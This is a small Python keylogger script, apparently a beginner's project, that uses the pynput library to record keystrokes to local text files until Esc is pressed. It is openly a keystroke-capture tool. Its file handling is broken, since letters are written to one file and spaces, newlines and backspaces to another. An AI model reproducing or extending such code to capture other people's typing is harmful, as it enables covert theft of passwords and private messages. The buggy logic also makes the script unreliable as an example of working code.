from pynput import keyboard

author = "Gokul B"

def on_press(key):
    
    try:
        if key == keyboard.Key.esc:
            print("Exiting....")
            return False

        elif key == keyboard.Key.space:
            with open("file.txt", "a") as file:
                file.write(" ")
        elif key == keyboard.Key.enter:
            with open("file.txt", "a") as file:
                file.write("\n")
        elif key == keyboard.Key.backspace:
            with open("file.txt", "a") as file:
                file.seek(file.tell() -1)
                file.truncate()
                
        else:
                
            with open("key_log.txt", "a") as file:
                file.write(f"{key.char}")
    except AttributeError:
        pass

def detect_and_save_keystrokes():
    print("Start typing! Press 'Esc' to quit")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    detect_and_save_keystrokes()


